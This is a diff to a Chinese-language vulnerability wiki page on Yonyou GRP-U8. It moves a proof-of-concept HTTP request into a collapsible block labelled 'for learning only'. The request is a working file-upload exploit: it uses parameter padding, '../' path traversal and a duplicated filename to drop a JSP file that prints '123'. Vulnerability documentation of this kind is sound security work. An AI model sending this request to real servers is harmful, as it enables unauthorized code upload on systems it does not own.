@@ -35,8 +35,10 @@ app="用友-GRP-U8"
 
 验证POC
 
-```
-POST /UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /UploadFileData?action=upload_file&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;foldername=%2e%2e%2f&amp;filename=debugg.jsp&amp;filename=1.jpg HTTP/1.1
 Host: 
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
 Accept-Encoding: gzip, deflate
@@ -49,9 +51,10 @@ User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (
 ------WebKitFormBoundary92pUawKc
 Content-Disposition: form-data; name="myFile";filename="test.jpg"
 
-<% out.println("123");%>
-------WebKitFormBoundary92pUawKc--
-```
+&lt;% out.println("123");%&gt;
+------WebKitFormBoundary92pUawKc--</code></pre>
+
+</details>
 
 ![image-20220824142335805](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202208241423854.png)
 
